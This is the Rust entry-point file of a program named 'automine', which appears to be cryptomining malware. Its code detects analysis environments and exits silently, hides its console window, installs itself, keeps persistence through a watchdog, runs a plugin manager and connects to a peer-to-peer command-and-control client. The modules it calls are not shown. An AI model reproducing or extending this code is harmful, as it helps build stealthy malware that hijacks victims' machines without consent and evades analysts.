mod commands;
mod common;
use obfstr::obfstr;
mod utils;
mod p2p;
mod host;
mod security;
mod modules;
mod discovery;

use clap::{Parser, Subcommand};

use commands::{install, start, status, uninstall};
use host::process::hide_console;
// use modules::miner::stop_mining;
use host::registry::is_installed;

#[derive(Parser)]
#[command(name = "automine")]
#[command(about = "Automine CLI", long_about = None)]
#[command(version)]
struct Cli {
    #[command(subcommand)]
    command: Option<Commands>,
}

#[derive(Subcommand)]
enum Commands {
    /// Uninstall completely
    Uninstall,
    /// Stop mining
    Stop,
    /// Show status
    Status,
    /// Manual Connect
    Connect { peer: String },
}

#[tokio::main]
async fn main() {
    // 0. Anti-Analysis Check (Before anything else)
    if security::anti_analysis::is_analysis_environment() {
        return; // Silent Exit
    }

    // Install Rustls Crypto Provider (Ring)
    let _ = rustls::crypto::ring::default_provider().install_default();

    hide_console();

    let cli = Cli::parse();

    match cli.command {
        Some(Commands::Uninstall) => {
            if let Err(e) = uninstall() {
                eprintln!("{}: {}", "Uninstall failed", e);
            }
        }
        Some(Commands::Stop) => {
            // if let Err(e) = stop_mining() {
            //     eprintln!("{}: {}", obfstr!("Stop failed"), e);
            // }
            println!("Stop command legacy.");
        }
        Some(Commands::Status) => {
            status();
        }
        Some(Commands::Connect { peer }) => {
            if let Err(e) = p2p::c2::start_client(Some(peer)).await {
                eprintln!("Connect Error: {}", e);
            }
        }
        None => {
            if !is_installed() {
                if let Err(e) = install() {
                    eprintln!("{}: {}", "Install failed", e);
                }
            } else {
                // 1. Maintain Persistence (Run Watchdog)
                if let Err(e) = start() {
                    eprintln!("{}: {}", "Start failed", e);
                }

                // 2. Start Plugin Manager
                tokio::spawn(async {
                    modules::plugin_manager::run_plugin_manager().await;
                });
 
                // 3. Start C2 (Blocking - Keeps Process Alive)
                if let Err(e) = p2p::c2::start_client(None).await {
                    eprintln!("{}: {}", "C2 Error", e);
                }
            }
        }
    }
}
